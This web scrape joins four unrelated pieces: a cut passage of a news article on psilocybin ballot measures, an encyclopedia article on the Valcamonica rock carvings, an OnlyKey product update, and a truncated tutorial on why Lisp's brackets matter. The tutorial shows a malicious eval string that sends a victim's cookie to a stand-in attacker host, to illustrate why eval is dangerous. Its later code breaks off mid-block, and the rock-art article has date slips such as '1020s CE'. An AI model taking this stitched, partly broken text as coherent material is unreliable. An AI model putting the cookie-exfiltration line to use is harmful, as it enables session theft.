year.&nbsp;&nbsp;</p><p>Many of these places were also the forerunners in the marijuana decriminalization and legalization movement. Oregon was the first state to decriminalize cannabis in 1973, while Colorado, along with Washington state, was the first to legalize recreational cannabis in 2012.&nbsp; Cities like Oakland and Denver were among the first to establish functioning legal markets for the drug. The movement grew to <a href="https://www.ncsl.org/research/health/state-medical-marijuana-laws.aspx" target="_blank">other places</a>, driven largely by ballot measures, with recreational pot sales allowed in 11 states and medical use of marijuana permitted in 32 states and the District of Columbia.</p><p>The gradual acceptance of marijuana set the stage for other drugs like mushrooms, said Heather Trela, a researcher who <a href="https://rockinst.org/blog/has-marijuana-provided-a-blueprint-for-magic-mushrooms/" target="_blank">studies cannabis policy</a> at the Rockefeller Institute of Government at the State University of New York.&nbsp;</p><p>“Marijuana broke the glass ceiling,” she explained. “Legalizing that drug wasn’t the catastrophe some people were expecting. Mushroom campaigns will certainly benefit from that pathway being cleared already.”</p><p>But the measures aren’t without critics. In Oregon, for example, medical organizations have warned about the dangers of moving ahead with offering patients treatments that aren’t fully vetted by the federal government.</p><p>U.S. Rep. Andy Harris, a Maryland Republican who is one of the <a href="https://www.washingtonpost.com/local/md-politics/maryland-rep-andy-harris-has-become-public-enemy-no-1-for-marijuana-activists-how-did-it-get-so-personal/2019/04/15/93ac9c32-5fc4-11e9-bfad-36a7eb36cb60_story.html" target="_blank">most vocal opponents</a> of D.C.’s attempt to legalize marijuana, urged city voters not to take the same attitude towards psychedelics that they did towards pot. “This is a bald-faced attempt to just make these very serious, very potent, very dangerous—both short-term and long-term—hallucinogenic drugs broadly available,” Harris said in an interview with the <a href="https://nypost.com/2020/07/08/congressman-vows-vote-to-stop-dc-from-allowing-psychedelics/" target="_blank"><em>New York Post</em></a><em>.</em></p><p>Some of the factors that helped marijuana gain legal status through ballot initiatives in states across the country won’t be as helpful for mushrooms. For starters, marijuana is the most popular recreational drug on the market, with close to <a href="https://www.washingtonpost.com/news/wonk/wp/2017/04/19/11-charts-that-show-marijuana-has-truly-gone-mainstream/" target="_blank">35 million people</a> defined as regular users who consume at least once a month—meaning there’s a lot of potential voters who’d like to see it legalized. The data on regular psychedelic drug users isn’t as reliable; the best estimates come from <a href="https://www.samhsa.gov/data/data-we-collect/nsduh-national-survey-drug-use-and-health" target="_blank">an annual survey</a> of around 67,500 people conducted by the Substance Abuse and Mental Health Services Administration, which has found an average of 0.1% of respondents to be current psychedelic users—scaled up to the U.S. population, that’s less than 350,000 people.&nbsp;</p><p>Because the potential user base is so small—and it seems unlikely to substantially increase due solely to decriminalization—ballot initiative organizers can’t make financial arguments about tax revenue, a <a href="https://www.westword.com/marijuana/colorado-crosses-1-billion-in-marijuana-tax-revenue-11374499" target="_blank">major selling point</a> for recreational marijuana. They also can’t make as clear an argument that psychedelic legalization is a knock against the War on Drugs, another common refrain in the pot legalization movement. (Although some researchers <a href="https://www.nytimes.com/2019/05/08/us/denver-magic-mushrooms-decriminalization.html" target="_blank">have argued</a> that labeling some drugs as “good” and other drugs as “bad” inherently perpetuates the drug war.)</p><p>In places like Denver, where voters decriminalized mushrooms in 2019, <a href="https://www.nytimes.com/2019/05/08/us/denver-magic-mushrooms-decriminalization.html" target="_blank">only 11 cases</a> for mushroom possession were prosecuted in the three years leading up to the ballot initiative, and numbers are similarly low in other places. “Mushrooms have never been a huge priority for law enforcement,” Trela said. “The data doesn’t exist to show disproportionate arrests of people of color in this case <a href="https://norml.org/marijuana/fact-sheets/racial-disparity-in-marijuana-arrests/" target="_blank">as it does for marijuana</a>.”</p><p>Sam Chapman, the campaign manager for <a href="https://voteyeson109.org/measure-109/" target="_blank">Yes on 109</a>, one of the ballot initiatives in Oregon, said that “cannabis is not psilocybin from a historical or political context” but that “cannabis legalization helped show the general public how big a failure the War on Drugs has been.” The biggest lesson mushroom campaigns can take from marijuana legalization, he said, is ensuring that people of color have equitable access to therapy and licensing if it becomes available—a stumbling point of some marijuana legalization efforts where critics have noted that the people who have <a href="https://www.usatoday.com/story/news/nation/2019/12/21/chicago-recreational-marijuana-dispensary-owners-diversity/4366180002/" target="_blank">reaped the benefits</a> of the new market have been largely white and male.</p><p>But organizers say they aren’t worried that they lack the financial and social justice arguments of the cannabis movement—because the chief benefit is the drug’s medical uses. “There’s a lot of scientific education that needs to be done for these campaigns, more so than with cannabis,” said Lavasani in D.C. “This isn’t a recreational party drug. It’s a therapy for people when no other solution works.”</p><figure><img alt="" height="900" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/10/23/Image%20from%20iOS%20(1).jpg" width="1200">

(The current psychedelic movement <a href="https://doubleblindmag.com/native-tribes-should-have-more-say-in-the-psychedelic-movement/" target="_blank">has been criticized</a> for failing to include Indigenous voices.)&nbsp;</p><p><a href="https://slate.com/technology/2017/01/the-war-on-drugs-halted-research-into-the-potential-benefits-of-psychedelics.html" target="_blank">Clinical research</a> and <a href="https://www.gla.ac.uk/media/Media_529630_smxx.pdf" target="_blank">recreational use</a> of the drug skyrocketed in the 1960s, followed by a swift crack down in 1968, when President Richard Nixon declared drugs to be “public enemy number one” and placed psychedelics like both LSD and mushrooms, along with marijuana, in the <a href="https://www.dea.gov/drug-scheduling" target="_blank">“Schedule 1” category</a>—meaning they have “no accepted medical use” and a “high potential for abuse.”</p><p>More recently, the FDA gave psilocybin a “<a href="https://newatlas.com/science/psilocybin-major-depression-mdd-usona-breakthrough-therapy-fda/" target="_blank">breakthrough therapy</a>” designation for patients who have treatment-resistant depression, an action meant to speed drug development. Research into psilocybin has been severely stymied since the 1960s, but institutions like Johns Hopkins, Stanford, and the University of California in Los Angeles have made significant strides in recent years showing the potential uses of psilocybin in treating <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6007659/" target="_blank">depression</a> and anxiety, <a href="https://journals.sagepub.com/doi/full/10.1177/2470547020939564" target="_blank">PTSD</a> among veterans, and <a href="https://clinicaltrials.gov/ct2/show/NCT04052568" target="_blank">eating disorders</a>. Researchers are hopeful about a number of other applications for diseases like smoking and drug addiction, Alzheimers, and multiple sclerosis.</p><p>That new research is changing the perception of psychedelics—but there’s still a lot of stigma, said Ismail Ali, the policy and advocacy counsel for the Multidisciplinary Association for Psychedelic Studies, a nonprofit research organization. “Right now one of the things that prevents people from publicly talking about psychedelic initiatives is because of this association with rowdy or hedonistic or non-establishment-friendly ideologies and communities,” Ali said. “There’s potential that if there's more visibility coming from [state and local initiatives], it would be easier for researchers and potential patients … to get good accurate information because it's less stigmatized to openly talk about it.”</p><p>Oregon’s Measure 109 might have the greatest chance of passing, Trela said, simply because it is so narrowly focused on the use of psilocybin in therapeutic contexts—and it therefore “cuts off slippery slope arguments.” But medical organizations have raised questions, most notably the <a href="http://www.oregonpsychiatric.org/uploads/6/0/5/6/60567621/20200912-m109apa.pdf" target="_blank">American Psychiatric Association</a> and the <a href="http://www.oregonpsychiatric.org/uploads/6/0/5/6/60567621/20200912-m109oppa.pdf" target="_blank">Oregon Psychiatric Physicians Association</a>, which argue that because psilocybin therapeutic treatment is not yet approved by the FDA, the measure “makes …</p></div></div></div></div>

<p>The rock drawings of Valcamonica are prehistoric petroglyphs carved in the glacier-polished, grey-purple Permian sandstone of the Camonica valley that extends for 90 km in the Italian provinces of Brescia and Bergamo in Lombardy. The name of the valley comes from “Cammunni”, the name its inhabitants carried during the <a href="https://www.ancient.eu/Iron_Age/">Iron Age</a>. Its artistic heritage, carved in 2500 rocks scattered along the entire valley, constitutes an extraordinary figurative testimony of the daily life and spirituality of ancient humans. The first appearance of these drawings can be dated back to the age of Epipaleolithic (20000-1000 BP) and the last to Medieval times (476-1453 CE) even if the best represented period is the Iron Age (1200 BCE - 200 CE). Between 200,000 and 300,000 incisions have been&nbsp;recognized and catalogued on the sandstone of the Camonica Valley. Most of these carvings represent animals and scenes of everyday life but also magic, <a href="https://www.ancient.eu/war/">war</a> and navigation. The uniqueness of this archaeological site is that the figures were realized during a time span of 8000 years and have resisted until today, almost undamaged. The Rock Drawings of Valcamonica were added to the UNESCO World Heritage in 1979 CE and were thus the first Italian site to be added to the list.</p><figure rel="12021" lang="en">

</figure><h3>History &amp; Discovery</h3><p>Different from every other European site of this kind, the carvings have always been part of the history of the population living in the Camonica Valley. However, before the 20th century CE, they were surrounded by indifference and they were called <em>pitoti&nbsp;</em>by the inhabitants of the valley. This name, in the local dialect, means 'scribbles', referring to the abstract and stylized drawings made by children. Only in the first years of the 20th century CE, precisely in 1914 CE, the alpinist and geographer Gualtiero Laeng signalled in the Touring Club Guide about the region, the presence of the two erratic boulders of Cemmo displaying some of the drawings of the valley. This helped to spread knowledge, contributing&nbsp;to an increase in&nbsp;interest in the prehistoric art of stone carvings of Valcamonica.</p><p>The Camunian rose, one of the most famous cravings of the valley, was chosen to become the symbol of the region of Lombardy itself.</p><p>In the 1020s CE, further studies were conducted, followed in the '30s by the politically-aimed research&nbsp;made by Franz Altheim and Erika Trautmann, commissioned by the then German Nazi officer, Heinrich Himmler. The purpose behind their studies was an&nbsp;attempt to&nbsp;identify&nbsp;in the carvings the north European origins of the <a href="https://www.ancient.eu/Aryan/">Aryan</a> race for it to be legitimized in the context of Hitler’s Third Reich. The same was done by Italian fascists&nbsp;who&nbsp;reclaimed the Italian origins of the carvings as a symbol of the industriousness that characterized the population of the territory before the <a href="https://www.ancient.eu/Roman/">Roman</a> period.</p><p>During the Second World War (1939-45 CE), the archaeological research&nbsp;was&nbsp;interrupted until 1959 CE. In this year, the first major step towards the site as it is known today was brought about by Laeng himself. He drew the first map of Naquane’s rock engravings and founded the first archaeological park in <a href="https://www.ancient.eu/italy/">Italy</a>. Of major importance to the site were the studies fostered by another important figure, Emmanuel Anati, an archaeologist whose&nbsp;meticulous and scientific method introduced the technique of the manual field surveying of the rocks. This method helped him to develop a stylistic classification of the Camunian representative art, being able in the following years to discover and classify thousands of rock carvings in the archaeological site.</p><figure rel="12022" lang="en">

</figure><p>During the 1970's CE, <em>pitoti</em>&nbsp;became a symbol of identity and heritage of the Camonica valley and in 1975 CE, the Camunian rose, one of the most famous cravings of the valley, was chosen to become the symbol of the region of Lombardy itself. The meaning of this<br>carving is unsure, but the presumed symbolism behind it is the sun with the four cardinal points indicating the solar trajectory in the sky during the day. This was interpreted by Anati as having&nbsp;a meaning of fortune and prosperity. In 1979 CE, during the third World Heritage Committee in Cairo, the Camonica Valley became the first Italian UNESCO site.</p><p>Oxen or elks, represented as the main characters of hunting scenes, are pierced &amp;&nbsp;killed by weapons.</p><p>The carvings were realized on Permian sandstone that was smoothed by the melting and sliding of glaciers. The main techniques used to realize the figures were two: the “martelline” and the “filiform” technique. The “marteline” consisted in tapping the rocky surface first with a stone tool and then a metallic one which creates small circular concavities. The other technique that was used in Camonica Valley is the “filiform” or “graffiti”: with this procedure, the representations are achieved by engraving the rocky surface with a pointed instrument used as a burin chisel. This instrument, rubbed several times on the rocks, would leave the <a href="https://www.ancient.eu/Mark/">mark</a> of a furrow.</p><p>The rock carvings of Valcamonica&nbsp;resulting from these two different techniques belong to four main stylistic groups. The first is the prehistoric period from the Epipaleolithic to the <a href="https://www.ancient.eu/Bronze_Age/">Bronze Age</a> where figures are isolated or grouped in a symbolic character. Following this, it is possible to witness some carvings from the proto-historic period during the Iron Age, where the artistic narrative is more naturalistic and characterized by movement and the description of actions. Finally, the carvings belonging to the last period can be associated with the Cammuni population, inhabiting the valley from&nbsp;Roman to&nbsp;medieval times.</p><figure rel="12020" lang="en">

</figure><h3>The Evolution of Cammunian Art</h3><p>The rock carvings belonging to the Prehistoric period are&nbsp;sometimes of considerable dimensions. These drawings depict figures of animals, among which oxen or elks, represented as the main characters of hunting scenes, pierced and killed by weapons. During the <a href="https://www.ancient.eu/Neolithic/">Neolithic</a> (10000-5000 BCE), the centre of the narrative characterizing the carvings of the Camonica Valley is shifted from animals to human beings. Characterizing this period were the symbolic representations of prayers in the orant position called “oranti”. These were stylized figures of human beings representing adoration, dance or lamentation. In this period the first representations of geometric figures were also found.</p><p>During the Chalcolithic (5000-4000 BCE), rock art is characterized by stelae and menhirs&nbsp;carved with symbolic and naturalistic figures. These rocks were placed in worship sites for ceremonies and rites or had a sepulchral function. These worship places were attended for thousands of years.</p><p>The <a href="https://www.ancient.eu/bronze/">Bronze</a> Age (3300-1200 BCE) was characterized by carvings representing ploughing scenes, looms and prayers while the Iron Age (1200 BCE - 200 CE) presents figures of warriors during hunting, duels and horseriding. These scenes represented the initiation rites faced by young aristocratic boys to become men. In these carvings, warriors are meticulously represented with a variety of weapons that were rediscovered by archaeological digs at&nbsp;the site of Val Camonica. In the representation of hunting scenes, the prayers are often deer, that were hunted by a man represented on a horse and helped by a dog. In addition, there are also drawings representing simple buildings, aquatic birds and footprints. Finally, with the Roman <a href="https://www.ancient.eu/conquest/">conquest</a> of the territory, the Cammunian Art saw its decline mainly due to the “fight” promoted by the believers of the Christian doctrine, during the 4th&nbsp;century CE, against the idolatry of carved stones, called in Latin <em>saxorum veneratio</em>. During the period of the Middle Ages (476-1453 CE), drawings of symbolic figures, towers, castles and churches represented the very last rock carvings of the Camonica Valley.</p><div><p><iframe data-src="https://www.youtube.com/embed/cxO5Jmbr2bc?autoplay=0" frameborder="0" allowfullscreen="" title="Rock Drawings in Valcamonica (UNESCO/NHK)"></iframe></p></div><h3>The Site Today</h3><p>The archaeological park was created in 1955 CE by the archaeological superintendence of Lombardy under the name of the National Park of Rock Engravings in Capo di Ponte (<em>Parco nazionale delle incisioni rupestri di Naquane</em>). Later, in 1964 CE, Emmanuel Anati founded the Cammunian Center of Prehistoric Studies. After the inclusion of the site in the UNESCO list, further research&nbsp;is still continuing today to broaden our&nbsp;knowledge of the site and unearthing new carvings and rocks. In the context of the archaeological site, eight&nbsp;different parks were realised, among which are the natural carving reserve of Ceto, Cimbergo and Paspardo, reaching an extension of 290 hectares distributed among 3 different municipalities. In addition, the most recent introduction in the park was in 2014 CE with the institution of the National Museum of Prehistory of the Camonica Valley (<em>Museo Nazionale di Preistoria della Valcamonica</em>). The importance and uniqueness of the archaeological discoveries within the site are&nbsp;a testimony to&nbsp;the great contribution that the Camonica Valley has brought to our&nbsp;knowledge of the history of the ancient humans.</p><p><em>This article was submitted as part of Ancient History Encyclopedia's UNESCO Summer School scholarship programme.</em></p> </article><p>

<div>

<div>
<p>For the past year, we have been busy making OnlyKey better, easier to use, and well-suited for remote workers. With our upcoming Fall release (to be released later in October) we will introduce some great new features such as:</p>
<h3><strong>OnlyKey GPG agent</strong></h3>
<p>This has been our #1 most requested feature, and it is finally here! For years, OnlyKey has supported an SSH agent, allowing secure passwordless SSH authentication. Now OnlyKey agent integrates with GPG to let users decrypt files, sign git commits, and even manage passwords (with pass and gopass). Instead of keeping GPG keys on a computer, OnlyKey generates and securely stores your keys off of the computer. We will also have the option to import your own existing PGP keys for more advanced users.</p>
<h3><strong>WebCrypt 3.0</strong></h3>
<p>We have greatly improved our webcrypt web application for OnlyKey on-the-go use. With our GPG agent we now have the ability to seamlessly use PGP anywhere, locally or in the browser (Chrome, Firefox, <a href="https://docs.crp.to/mobile.html">Android, and Safari on iPhone</a>). In the browser, WebCrypt now supports:</p>
<ul><li>Multiple-recipient encrypted messages and files.</li><li>Send to Keybase users and now also Protonmail users directly in the app. Just type their username or Protonmail email address.</li><li>User search has been improved to also include Protonmail. Find Keybase and Protonmail user’s by name or email.</li><li>Support for multiple PGP key types RSA or X25519 (used by Protonmail).</li><li>File and message share links. We have developed an innovative way to allow file sharing links using an open-source decentralized database called <a href="https://gun.eco/">GUN</a>. Share links utilize a double layer of encryption.</li><li>3rd-party developer API. We have developed an innovative way to permit 3rd-party developer use in external applications. OnlyKey generates an unlimited number of derived keys which are unique to a developer’s domain and may be used in web applications. We plan to release this on NPM soon.</li></ul>
<h3><strong>SysAdmin Mode</strong></h3>
<p>Another top-requested feature, enabling SysAdmin mode permits OnlyKey to type almost any combination of characters in addition to usernames and passwords. For example, wouldn’t it be nice to login to Windows with just a single button press? SysAdmin mode permits OnlyKey to enter Ctrl-Alt-Del, then enter usernames and passwords. Another example might be allowing OnlyKey to type Ctrl+Alt+T to open a terminal in Ubuntu to run a commonly used command. Of course, with this feature additional security is also required and a privileged access mode is required to configure these values.</p>
<h3><strong>Primary Profile and Secondary Profile LED Color</strong></h3>
<p>OnlyKey supports a primary and secondary profile, switching between the two is now even easier. Hold down button #3 for 5 seconds to lock OnlyKey and switch profiles. Recognizing which profile you are logged into is now easier with profile colors, OnlyKey has Green light for Primary profile and Blue light for Secondary profile.</p>
<h3><strong>Security Key (FIDO2 / FIDO U2F) Updates</strong></h3>
<p>Updates have been made for improved usability of the security key feature and to support the ability to manage FIDO2 resident keys.</p>
<h2><strong>What else is new?</strong></h2>
<p><strong>New OnlyKey Community Forum</strong> – We have launched our new OnlyKey Community Forum available here – <a href="https://onlykey.discourse.group/">https://onlykey.discourse.group</a>. This will replace the existing OnlyKey Support Forum.</p>
<p><strong>KeePassXC Support</strong> – OnlyKey is supported in KeePassXC. A recent update to KeePassXC allows using OnlyKey as a security key to protect your software password manager. If you are in the market for a free, open source, and cross-platform software password manager, check out <a href="https://keepassxc.org/docs/#faq-yubikey-howto">KeePassXC</a> and check out the <a href="https://docs.crp.to/usersguide.html#keepassxc">OnlyKey Users Guide</a> to get started.</p>
<p><strong>Improved OnlyKey SSH Support</strong> – OnlyKey SSH agent now supports both derived keys and stored keys for users who wish to use a single key to log into multiple servers. PGP (RSA and ECC) key import support will be added in our next OnlyKey SSH agent release. This allows users to import existing keys to OnlyKey for secure SSH. Alternatively, OpenSSH supports OnlyKey — read more about that <a href="https://docs.crp.to/openssh.html">here</a>.</p>
<p><span>We are in the final phases of testing a new, more portable USB-A &amp; USB-C OnlyKey hardware platform and expect to have some news about launch in late 2020 / early 2021. Stay tuned!</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>// same as</span>
<span>[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]]]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]],</span>
<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>"do"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>do</span><span>: (</span><span>...</span><span>args</span><span>) </span><span>=&gt;</span><span> </span><span>args</span><span>[</span><span>args</span><span>.length </span><span>-</span><span> </span><span>1</span><span>],</span>
<span>  };</span>
<span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>if</span><span> (</span><span>!</span><span>Array</span><span>.isArray</span><span>(</span><span>ins</span><span>)) {</span>
<span>      </span><span>// this must be a primitive argument, like {x: 0, y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>
<span>    }</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>
<span>    </span><span>return</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>.map</span><span>(</span><span>parseInstruction</span><span>));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"drawPoint"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }],</span>
<span>  [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]],</span>
<span>];</span></code></pre><p>Let’s make it more interesting. What if we wanted to support <em>definitions?</em></p><pre><code><span>const</span><span> </span><span>shape</span><span> </span><span>=</span><span> </span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span></code></pre><p>If we could support definitions, our remote user could write some very expressive instructions! Let’s convert our code to the kind of data structure we’ve been playing with:</p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span>
<span>[</span><span>"rotate"</span><span>, </span><span>"shape"</span><span>, </span><span>90</span><span>]</span></code></pre><p>Noot bad! If we can support an instruction like that, we’d be golden! Here’s how: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>variables</span><span> </span><span>=</span><span> {};</span>

<span>];</span></code></pre><p>Not bad!</p><p>Let’s step it up a notch. What if we let our remote user <em>define their own functions?</em> </p><p>Say they wanted to write something like this:</p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) { </span>

<span>} </span>
